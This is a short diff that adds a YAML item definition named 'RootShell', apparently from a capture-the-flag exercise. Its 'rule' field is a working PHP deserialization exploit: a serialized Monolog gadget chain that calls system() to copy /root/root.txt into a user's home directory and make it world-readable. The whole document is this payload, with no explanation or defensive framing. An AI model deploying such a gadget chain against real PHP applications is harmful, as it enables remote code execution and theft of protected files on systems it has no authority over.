@@ -1,0 +1,6 @@
+name: RootShell
+description: Pwn
+image: "data:image/png;base64,AA=="
+price: 1337
+rule_msg: "Pwned"
+rule: !!php/object "O:24:"Monolog\Handler\GroupHandler":1:{s:16:"\0*\0handlers";a:1:{i:0;O:29:"Monolog\Handler\SyslogUdpHandler":2:{s:9:"\0*\0socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"\0*\0handler";r:4;s:13:"\0*\0bufferSize";i:-1;s:9:"\0*\0buffer";a:1:{i:0;a:2:{0:s:60:"cp /root/root.txt /home/auctioneer/root.txt && chmod 644 /home/auctioneer/root.txt";s:5:"level";i:0;}}s:8:"\0*\0level";i:0;s:14:"\0*\0initialized";b:1;s:14:"\0*\0bufferLimit";i:-1;s:13:"\0*\0processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}s:6:"\0*\0host";s:9:"127.0.0.1";s:6:"\0*\0port";i:514;}}}}"
